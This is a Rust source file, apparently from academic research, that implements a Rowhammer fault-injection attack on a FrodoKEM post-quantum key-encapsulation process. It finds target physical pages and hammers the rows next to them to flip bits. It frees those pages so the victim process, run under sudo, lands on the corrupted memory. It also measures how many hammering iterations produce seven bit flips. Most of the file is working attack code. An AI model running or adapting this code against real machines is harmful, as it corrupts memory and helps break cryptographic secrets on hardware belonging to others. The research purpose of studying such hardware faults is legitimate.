use core::ffi::c_void;

use std::{
    fs::File,
    io::{self, BufRead, BufReader, Write},
    path::Path,
    process::{self, Command},
    thread,
    time::{Duration, Instant},
};

use nix::{
    sched::{sched_setaffinity, CpuSet},
    sys::mman::munmap,
    unistd::{fork, ForkResult, Pid},
};
use procfs::process::Process;

use crate::profiler::{
    pagefinder::{get_candidate_pages, PageCandidate},
    utils::{
        self, collect_pages_by_row, count_flips_by_bit, fill_memory, get_block_by_order,
        get_page_frame_number, rowhammer, rowhammer_once, setup_mapping,
    },
};

//const TEST_ITERATIONS: u32 = 10;
const INIT_PATTERN: u16 = 0x0;

fn get_page_pfns(input_path: impl AsRef<Path>) -> Result<(u64, (u64, u64), (u64, u64)), String> {
    let file = File::open(input_path).expect("Failed to open file.");

    for line in BufReader::new(file).lines() {
        let line = line.expect("Error when reading line in file.");

        if !line.starts_with(">") {
            continue;
        }

        let p = line[1..]
            .split_whitespace()
            .take(5)
            .map(|s| {
                u64::from_str_radix(
                    match s.strip_prefix("0x") {
                        Some(s) => s,
                        None => s,
                    },
                    16,
                )
                .expect("Failed to parse hexstring in input file to u64")
            })
            .collect::<Vec<_>>();

        return Ok((p[0], (p[1], p[2]), (p[3], p[4])));
    }

    Err(String::from("Couldnt parse pfns from file"))
}

fn sanity_check_attack(pages: &[PageCandidate]) {
    println!("Initializing pages for sanity check.");

    for page in pages {
        unsafe {
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.0.virt_addr,
                page.below_pages.0.virt_addr,
            );
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.1.virt_addr,
                page.below_pages.1.virt_addr,
            );
        }
    }

    let start = Instant::now();

    loop {
        for page in pages {
            rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
        }

        // Check if we've been running for set amount of time
        if start.elapsed().as_secs() >= 5 {
            break;
        }
    }

    println!(
        "Sanity check took {} ms",
        start.elapsed().as_millis() as f64,
    );

    // Check flips in the victim pages
    for page in pages {
        let (flips, flip_offsets) = count_flips_by_bit(&page.target_page, INIT_PATTERN);

        println!(
            "Page {:#x} had {:?} flips.\nWith offsets: {:?}",
            page.target_page.pfn, flips, flip_offsets,
        );
    }
}

fn check_attack(pages: &[PageCandidate], iterations: usize) -> (Duration, u64) {
    for page in pages {
        unsafe {
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.0.virt_addr,
                page.below_pages.0.virt_addr,
            );
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.1.virt_addr,
                page.below_pages.1.virt_addr,
            );
        }
    }

    let start = Instant::now();

    for _ in 0..iterations {
        for page in pages {
            rowhammer_once(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
        }
    }

    let elapsed = start.elapsed();

    let total_flips: usize = pages
        .iter()
        .map(|page| count_flips_by_bit(&page.target_page, INIT_PATTERN).1.len())
        .sum();

    (elapsed, total_flips as u64)
}

pub(crate) fn check_attack_time_needed(pages: &[PageCandidate]) {
    // Check upper limit of how many iterations are needed to get 7 flips
    let mut iterations = 1 << 10;
    let max_iterations_needed = loop {
        let (_, flips) = check_attack(pages, iterations);

        if flips >= 7 {
            break iterations;
        } else {
            iterations *= 2;
        }
    };

    // Reduce iterations to get more accurate time
    let mut d_iterations = iterations / 4;
    let mut iterations = max_iterations_needed - d_iterations;
    let (time_needed, iterations_needed) = loop {
        let (elapsed, flips) = check_attack(pages, iterations);

        // If we didnt get enough flips, increase iterations. Else decrease.
        if flips < 7 {
            iterations += d_iterations;
        } else {
            iterations -= d_iterations;
        }

        if d_iterations == 1 {
            break (elapsed.as_micros(), iterations);
        } else {
            d_iterations /= 2;
        }
    };

    println!(
        "Time needed for at least 7 flips: {} us, with {} iterations",
        time_needed, iterations_needed
    );
}

fn rowhammer_attack(pages: &[PageCandidate], number_of_dummy_pages: usize) {
    println!("Initializing pages for attack.");

    for page in pages {
        unsafe {
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.0.virt_addr,
                page.below_pages.0.virt_addr,
            );
            fill_memory(
                page.target_page.virt_addr,
                page.above_pages.1.virt_addr,
                page.below_pages.1.virt_addr,
            );
        }
    }

    let pagemap = &mut Process::myself()
        .expect("Couldn't get process info")
        .pagemap()
        .expect("Couldn't get pagemap of process");
    let mut block_mapping = get_block_by_order(12);

    println!("Preparing dummy pages...");

    // A vec of tuples containing (virtual_address, page_frame_number)
    let mut dummy_pages = Vec::with_capacity(2 * number_of_dummy_pages);
    for i in 0.. {
        let virtual_addr = unsafe { block_mapping.as_mut_ptr().add(i * utils::PAGE_SIZE) };

        match get_page_frame_number(pagemap, virtual_addr) {
            Ok(pfn) => {
                if pfn <= 0x100000 {
                    dummy_pages.push((virtual_addr, pfn));
                }
                if dummy_pages.len() >= 2 * number_of_dummy_pages {
                    break;
                }
            }
            Err(_) => {
                continue;
            }
        }
    }

    println!("Starting attack!");
    io::stdout().flush().unwrap();

    match unsafe { fork() } {
        Ok(ForkResult::Parent { child }) => {
            println!("Started attack in child process {}", child);

            let ok = Command::new("./src/degradation/run_degradation.sh")
                .status()
                .expect("Running degradation failed");

            thread::sleep(Duration::from_secs(10));

            // Set Cpu affinity to core 1
            let mut cpu_set = CpuSet::new();
            cpu_set.set(1).unwrap();
            sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();

            // Unmap all allocated pages to make room for the FrodoKEM process
            // Check if works with block_mapping len or if we need STACK_SIZE TODO!
            for (v_addr, _) in &dummy_pages[0..number_of_dummy_pages] {
                unsafe {
                    munmap(*v_addr as *mut c_void, utils::PAGE_SIZE).expect(&format!(
                        "Tried to unmap {:?} but it was not mapped!",
                        v_addr
                    ));
                }
            }

            for page in pages {
                unsafe {
                    munmap(page.target_page.virt_addr as *mut c_void, utils::PAGE_SIZE).expect(
                        &format!(
                            "Tried to unmap {:?} but it was not mapped!",
                            page.target_page.virt_addr
                        ),
                    );
                }
            }

            for (v_addr, _) in &dummy_pages[number_of_dummy_pages..] {
                unsafe {
                    munmap(*v_addr as *mut c_void, utils::PAGE_SIZE).expect(&format!(
                        "Tried to unmap {:?} but it was not mapped!",
                        v_addr
                    ));
                }
            }

            let ok = Command::new("sudo")
                .arg("taskset")
                .arg("0x2")
                .arg(
                    "/home/development/Frodo/PQCrypto-LWElsls
                sadKE/frodo640/test_KEM",
                )
                .status()
                .expect("failed to execute command");

            println!("FrodoKEM process exited with: {}", ok);
            thread::sleep(Duration::from_secs(5));

            println!("Killing child process {}", child);
            let ok = Command::new("sudo")
                .arg("kill")
                .arg("-9")
                .arg(format!("{}", child))
                .status()
                .expect("failed to kill child, sorry master :(");

            println!("Killing degradations...");
            let ok = Command::new("sudo")
                .arg("pkill")
                .arg("-f")
                .arg("degrade")
                .status()
                .expect("failed to kill degradations");

            //for page in &pages {
            //    let (flips, flip_offsets) = count_flips_by_bit(&page.target_page, INIT_PATTERN);

            //    println!(
            //        "Page {:#x} had {:?} flips.\nWith offsets: {:?}",
            //        page.target_page.pfn, flips, flip_offsets,
            //    );
            //}
        }

        Ok(ForkResult::Child) => {
            println!("Running attack");

            // Setting Cpu affinity to core 1
            let mut cpu_set = CpuSet::new();
            cpu_set.set(2).unwrap();
            sched_setaffinity(Pid::from_raw(0), &cpu_set).unwrap();

            // Set values to allocated memory before attacking
            // Check if works with block_mapping len or if we need STACK_SIZE TODO!
            for (v_addr, _) in &dummy_pages[0..number_of_dummy_pages] {
                unsafe {
                    **v_addr = (pages.len() + *v_addr as usize) as u8 & 0xFF;
                }
            }

            for (i, page) in pages.iter().enumerate() {
                unsafe {
                    std::ptr::write_bytes(
                        page.target_page.virt_addr,
                        i as u8 & 0xFF,
                        utils::PAGE_SIZE,
                    )
                }
            }

            for (v_addr, _) in &dummy_pages[number_of_dummy_pages..] {
                unsafe {
                    **v_addr = (pages.len() + *v_addr as usize) as u8 & 0xFF;
                }
            }

            loop {
                for page in pages {
                    rowhammer(page.above_pages.0.virt_addr, page.below_pages.0.virt_addr);
                }
            }
        }
        Err(_) => {
            println!("Failed to fork process");
            process::exit(1);
        }
    }

    println!("Done with attack");
}

pub(crate) fn main(
    fraction_of_phys_memory: f64,
    dimms: u8,
    testing: bool,
    number_of_dummy_pages: usize,
) {
    let row_size = 128 * 1024 * dimms as usize;
    let mut mmap = setup_mapping(0.0);

    let mut hammer = true;

    if testing {
        hammer = false;
    }

    let victim_pfns = [0x3b4bf1, 0x3dd31e, 0x400b3a];
    //let victim_pfns = [0x3b4bf1];
    let mut victim_pages = Vec::new();

    for pfn in &victim_pfns {
        let file = format!("data/V_{:#x}.out", pfn);
        victim_pages.push(get_page_pfns(file).unwrap());
    }

    println!("Setting up memory mapping...");
    let (mmap, pages_by_row, victims) = loop {
        std::mem::drop(mmap);
        mmap = setup_mapping(fraction_of_phys_memory);

        println!("Collecting all pages in all rows...");
        let pages_by_row = collect_pages_by_row(&mut mmap, row_size).unwrap();

        if pages_by_row.len() < 3 {
            eprintln!(
                "[!] Can't hammer rows - only got {} rows total. Make sure you're running as sudo!",
                pages_by_row.len()
            );
        }

        let victims = get_candidate_pages(&pages_by_row, &victim_pages);

        if victims.len() != victim_pfns.len() {
            let missed_pfns = victim_pfns
                .iter()
                .filter(|pfn| !victims.iter().any(|page| page.target_page.pfn == **pfn))
                .collect::<Vec<_>>();
            println!(
                "Couldn't find all victim pages in mapping, remapping! Missing pages: {:#x?}",
                missed_pfns,
            );
            continue;
        }

        break (mmap, pages_by_row, victims);
    };

    let indices = (0..pages_by_row.len() - 2).collect::<Vec<_>>();

    'main: for above_row_index in indices {
        let target_row_index = above_row_index + 1;
        let below_row_index = above_row_index + 2;

        let above_row = &pages_by_row[above_row_index];
        let target_row = &pages_by_row[target_row_index];
        let below_row = &pages_by_row[below_row_index];

        // If any of the rows are not full we can't hammer them, so continue to the next iteration
        for i in 0..3 {
            if pages_by_row[above_row_index + i].len() != row_size as usize / utils::PAGE_SIZE {
                continue 'main;
            }
        }
    }

    for page in &victims {
        println!(
            "Page:{:#x?}, Address:{:?}\n",
            page.target_page.pfn, page.target_page.virt_addr
        )
    }

    if hammer {
        rowhammer_attack(&victims, number_of_dummy_pages);
    } else {
        check_attack_time_needed(&victims);
    }

    println!("Done with attack");
}
